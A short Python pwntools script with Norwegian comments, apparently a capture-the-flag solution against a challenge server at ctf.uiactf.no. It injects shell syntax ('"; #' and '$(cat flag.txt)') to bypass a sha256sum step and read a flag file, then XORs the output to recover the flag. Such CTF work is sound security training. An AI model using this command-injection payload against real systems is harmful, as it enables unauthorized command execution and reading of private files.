from binascii import unhexlify
from pwn import *

io = connect("ctf.uiactf.no", 5003)
io.recvuntil(b'> ').decode()

# Send 50 mellomrom (0x20) og avslutt med '"; #' for å bypasse sha256sum
io.sendline(b'\x20' * 50 + b'"; #')

# Motta nøkkel XOR'ed med 0x20
io.recvline().decode()
io.recvuntil(b'> ').decode()
key_xor_space = io.recvline(False).decode()
#print(key_xor_space)
key_xor_space = unhexlify(key_xor_space)
#print(key_xor_space)

io.recvuntil(b'> ').decode()

# Send payload for å lese ut flagg
io.sendline(b'$(cat flag.txt)"; #')

# Motta flagg XOR'ed med nøkkel
io.recvline().decode()
io.recvuntil(b'> ').decode()
flag_xor_key = io.recvline(False).decode()
#print(flag_xor_key)
flag_xor_key = unhexlify(flag_xor_key)
#print(flag_xor_key)

# XOR nøkkel med 0x20 for å finne ekte nøkkel
key = [i ^ 0x20 for i in key_xor_space]

# XOR flagg med ekte nøkkel for å finne flagg
flag = [flag_xor_key[i] ^ key[i] for i in range(len(flag_xor_key))]

# print(key_xor_space)
# print(key)
# print(flag_xor_key)
# print(flag)
print(''.join(map(chr, flag)))
